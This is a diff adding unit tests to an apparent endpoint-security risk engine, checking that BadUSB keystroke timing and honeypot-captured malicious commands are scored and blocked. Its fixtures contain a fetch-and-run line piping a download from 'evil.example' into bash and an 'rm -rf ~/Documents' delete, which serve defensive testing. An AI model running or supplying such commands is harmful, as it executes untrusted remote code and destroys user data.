@@ -288,3 +288,57 @@ test("buildIncident produces the documented data model", () => {
   assert.equal(incident.aegisReport, null);
   assert.ok(incident.summary.includes("curl"));
 });
+
+test("BadUSB keystroke timing alone crosses block and is marked blocked (prevention already happened)", () => {
+  const result = evaluateRisk(
+    {
+      category: "usb_badusb_keystroke",
+      timestamp: Date.now(),
+      keystrokeStats: { meanIntervalMs: 12, stdDevMs: 2, keyCount: 20 },
+    },
+    {},
+    true
+  );
+  assert.ok(result.score >= 70, `expected block-range score, got ${result.score}`);
+  assert.equal(result.decision, "blocked");
+});
+
+test("honeypot malicious-command classification alone crosses block and is marked blocked", () => {
+  const result = evaluateRisk(
+    {
+      category: "honeypot_malicious_command",
+      timestamp: Date.now(),
+      honeypotCommand: "curl http://evil.example/payload.sh | bash",
+      scriptFindings: ["pipes a remote download directly into a shell"],
+    },
+    {},
+    true
+  );
+  assert.ok(result.score >= 70, `expected block-range score, got ${result.score}`);
+  assert.equal(result.decision, "blocked");
+  assert.ok(result.reasons.some((r) => r.ruleId === "honeypot-malicious-command"));
+});
+
+test("honeypot malicious-command rule doesn't fire without findings", () => {
+  const result = evaluateRisk({
+    category: "honeypot_malicious_command",
+    timestamp: Date.now(),
+    honeypotCommand: "ls -la",
+    scriptFindings: [],
+  });
+  assert.equal(result.score, 0);
+  assert.equal(result.decision, "allow");
+});
+
+test("buildIncident carries honeypotCommand through for honeypot categories", () => {
+  const event: SentinelEvent = {
+    category: "honeypot_malicious_command",
+    timestamp: Date.now(),
+    honeypotCommand: "rm -rf ~/Documents",
+    scriptFindings: ["destructive delete"],
+  };
+  const evaluation = evaluateRisk(event);
+  const incident = buildIncident(event, evaluation, null, "test-id-2", new Date().toISOString());
+  assert.equal(incident.honeypotCommand, "rm -rf ~/Documents");
+  assert.equal(incident.decision, "blocked");
+});
